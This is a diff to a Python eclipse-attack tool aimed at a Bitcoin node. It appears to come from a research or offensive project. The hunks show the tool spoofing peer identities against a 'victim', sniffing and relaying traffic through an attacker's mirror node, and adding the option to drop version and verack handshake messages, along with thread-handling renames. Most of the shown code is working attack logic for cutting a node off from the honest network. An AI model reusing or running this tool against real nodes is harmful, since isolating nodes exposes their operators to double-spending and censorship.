@@ -29,9 +29,9 @@ num_identities = 8
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
 
-seconds_delay = {
-	'version': 0,
-	'verack': 0,
+seconds_delay = { # -1 to drop the packet
+	'version': -1,
+	'verack': -1,
 	'addr': 0,
 	'inv': 0,
 	'getdata': 0,
@@ -206,13 +206,13 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 	identity_socket.append(s)
 
 
-	mirror_socket = mirror_make_fake_connection(socket, interface, src_ip, verbose)
+	mirror_socket = mirror_make_fake_connection(interface, src_ip, verbose)
 	if mirror_socket != None:
 		identity_mirror_socket.append(mirror_socket)
 
 	# Listen to the connections for future packets
 	if verbose: print(f'Attaching packet listener to {interface}')
-	createTask('Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
+	create_task('Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
 	"""try:
 		start_new_thread(sniff, (), {
 			'socket': s,
@@ -228,7 +228,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 	if mirror_socket != None:
 		if verbose: print(f'Attaching mirror packet listener to {interface}')
-		createTask('Mirror identity ' + src_ip, sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
+		create_task('Mirror identity ' + src_ip, sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
 		"""try:
 			start_new_thread(mirror_sniff, (), {
 				'socket': mirror_socket,
@@ -244,7 +244,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 
 # Creates a fake connection to the victim
-def mirror_make_fake_connection(socket, interface, src_ip, verbose=True):
+def mirror_make_fake_connection(interface, src_ip, verbose=True):
 	src_port = random.randint(1024, 65535)
 	dst_ip = attacker_ip
 	dst_port = 8333
@@ -288,7 +288,7 @@ def mirror_make_fake_connection(socket, interface, src_ip, verbose=True):
 def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		packet = socket.recv(65565)
-		createTask('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface)
+		create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface)
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
@@ -342,7 +342,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, from_i
 def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		packet = socket.recv(65565)
-		createTask('Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface)
+		create_task('Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
@@ -375,8 +375,11 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, f
 
 	# Relay Bitcoin packets that aren't from the victim
 	if msg_type in seconds_delay:
+		if seconds_delay[msg_type] == -1:
+			print(f'*** *** Dropping packet  ** {from_ip} --> {to_ip} ** {msg_type}')
+			return # Drop the packet
 		if seconds_delay[msg_type] != 0:
-			print(f'**(* Delaying message by {seconds_delay[msg_type]} seconds ** {from_ip} --> {to_ip} ** {msg_type}')
+			print(f'*** *** Delaying message by {seconds_delay[msg_type]} seconds ** {from_ip} --> {to_ip} ** {msg_type}')
 			time.sleep(seconds_delay[msg_type])
 
 	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
@@ -386,10 +389,8 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, f
 		#	pong = msg_pong(bitcoin_protocolversion)
 		#	pong.nonce = msg.nonce
 		#	socket.send(pong.to_bytes())
-		if msg_type == 'version': pass # Ignore version
-		elif msg_type == 'verack': pass # Ignore version
-		else:
-			orig_socket.send(packet) # Relay to the victim
+
+		orig_socket.send(packet) # Relay to the victim
 
 	except Exception as e:
 		print("Closing socket because of error: " + str(e))
@@ -482,21 +483,19 @@ class Task(threading.Thread):
 		return self._stop_event.is_set()
 
 # Creates a new thread and starts it
-def createTask(name, function, *args):
+def create_task(name, function, *args):
 	task = Task(name, function, *args)
 	threads.append(task)
 	task.start()
 	return task
 
 # Remove any threads that are stopped
-def purgeStoppedThreads():
-	activeThreads = []
+def purge_stopped_threads():
+	active_threads = []
 	for thread in threads:
 		if not thread.stopped():
-			activeThreads.append(thread)
-	threads = activeThreads
-
-
+			active_threads.append(thread)
+	threads = active_threads
 
 # This function is ran when the script is stopped
 def on_close():
@@ -509,7 +508,6 @@ def on_close():
 	cleanup_ipaliases()
 	cleanup_iptables()
 	print('Cleanup complete. Goodbye.')
-
 
 # This is the first code to run
 if __name__ == '__main__':
